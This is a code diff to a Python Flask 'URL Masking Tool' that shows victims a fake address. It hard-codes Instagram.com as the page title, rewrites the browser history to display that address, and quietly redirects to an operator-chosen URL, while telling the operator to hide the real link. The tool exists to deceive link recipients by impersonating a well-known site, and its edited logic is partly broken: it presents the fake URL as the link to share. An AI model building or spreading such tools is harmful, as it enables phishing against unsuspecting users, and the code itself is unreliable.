@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template_string
+from flask import Flask, request, render_template_string, redirect
 import random
 import string
 import threading
@@ -40,7 +40,7 @@ def display_banner():
           ██║   ██║██╔██╗ ██║██║  ██║██║     ██║  ███╗█████╗  ██████╔╝
           ██║   ██║██║╚██╗██║██║  ██║██║     ██║   ██║██╔══╝  ██╔══██╗
           ╚██████╔╝██║ ╚████║██████╔╝███████╗╚██████╔╝███████╗██║  ██║
-           ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
+           ╚════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
 
             URL Masking Tool (Version 3.0)
           Created by [Your Name Here]
@@ -62,7 +62,7 @@ def mask_url(public_url):
     display_banner()
     print("\n\033[92m[+]\033[0m Enter the Original URL (e.g., http://instagram.com):")
     original_url = input("\033[93m> \033[0m").strip()
-    print("\n\033[92m[+]\033[0m Enter the Fake URL (e.g., http://youtube.com):")
+    print("\n\033[92m[+]\033[0m Enter the Fake URL (e.g., http://Instagram.com):")
     fake_url = input("\033[93m> \033[0m").strip()
 
     if not original_url.startswith(('http://', 'https://')):
@@ -71,87 +71,48 @@ def mask_url(public_url):
         fake_url = 'http://' + fake_url
 
     random_path = generate_random_string()
-    fake_domain = fake_url.split('//')[1].split('/')[0]
     masked_url = f"{public_url}/{random_path}"
 
     url_mapping[random_path] = original_url
 
-    print(f"\n\033[92m[+]\033[0m Your Public Masked URL: \033[96m{masked_url}\033[0m")
-    print("\033[92m[+]\033[0m This URL will show the fake URL but redirect to the original URL.")
+    print(f"\n\033[92m[+]\033[0m Your Public Masked URL: \033[96m{fake_url}\033[0m")
+    print(f"\033[92m[+]\033[0m Note: The actual URL is: \033[96m{masked_url}\033[0m (Do not share this)")
     input("\n\033[92m[+]\033[0m Press Enter to continue...")
-
-@app.route("/")
-def home():
-    return render_template_string('''
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Loading...</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: white;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        .loader {
-            width: 40px;
-            height: 40px;
-            border: 4px solid rgba(0, 0, 0, 0.1);
-            border-radius: 50%;
-            border-top-color: #333;
-            animation: spin 1s ease-in-out infinite;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-    </style>
-</head>
-<body>
-    <div class="loader"></div>
-</body>
-</html>
-''')
 
 @app.route('/<path:random_path>')
 def fake_page(random_path):
     if random_path in url_mapping:
+        fake_url = "http://Instagram.com"  # You can dynamically set this based on your logic
         return render_template_string(f'''
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading...</title>
+    <title>{fake_url}</title>
     <meta http-equiv="refresh" content="2; url={url_mapping[random_path]}">
     <style>
         body {{
             font-family: Arial, sans-serif;
-            background-color: white;
             margin: 0;
             padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
         }}
-        .loader {{
-            width: 40px;
-            height: 40px;
-            border: 4px solid rgba(0, 0, 0, 0.1);
-            border-radius: 50%;
-            border-top-color: #333;
-            animation: spin 1s ease-in-out infinite;
+    </style>
+    <script>
+        document.title = "{fake_url}";
+        if (window.history.replaceState) {{
+            window.history.replaceState(null, null, "{fake_url}");
         }}
+    </script>
+</head>
+<body>
+    <div style="text-align: center; margin-top: 200px;">
+        <div style="width: 40px; height: 40px; border: 4px solid rgba(0, 0, 0, 0.1); border-radius: 50%; border-top-color: #333; animation: spin 1s ease-in-out infinite; margin: 0 auto;"></div>
+        <p style="margin-top: 20px; color: #333;">Loading...</p>
+    </div>
+    <style>
         @keyframes spin {{
             to {{ transform: rotate(360deg); }}
         }}
     </style>
-</head>
-<body>
-    <div class="loader"></div>
 </body>
 </html>
 ''')
